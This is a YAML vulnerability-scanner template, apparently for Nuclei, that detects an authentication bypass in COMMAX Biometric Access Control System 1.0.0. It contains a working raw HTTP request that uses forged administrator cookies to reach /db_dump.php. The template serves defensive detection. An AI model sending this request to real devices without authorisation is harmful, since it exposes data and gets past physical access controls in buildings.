id: commax-biometric-auth-bypass
info:
  name: COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass
  author: gy741
  severity: critical
  description: The COMMAX Biometric Access Control System 1.0.0 is vulnerable to an
    authentication bypass, allowing unauthenticated attackers to access sensitive
    information and bypass physical controls in smart homes and buildings through
    cookie poisoning.
  reference:
  - https://www.exploit-db.com/exploits/50206
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5661.php
  tags: commax,auth-bypass,edb
  metadata:
    impact: The authentication bypass vulnerability in the COMMAX Biometric Access
      Control System 1.0.0 could potentially lead to the compromise of sensitive data
      and the bypassing of physical controls, posing a significant impact on the security
      of smart homes and buildings.
    recommendation: It is recommended to update COMMAX Biometric Access Control System
      to the latest version to mitigate the risk of an authentication bypass vulnerability.
requests:
- raw:
  - 'GET /db_dump.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Referer: {{BaseURL}}/user_add.php

    Cookie: CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9;
    CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '<title>::: COMMAX :::</title>'
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
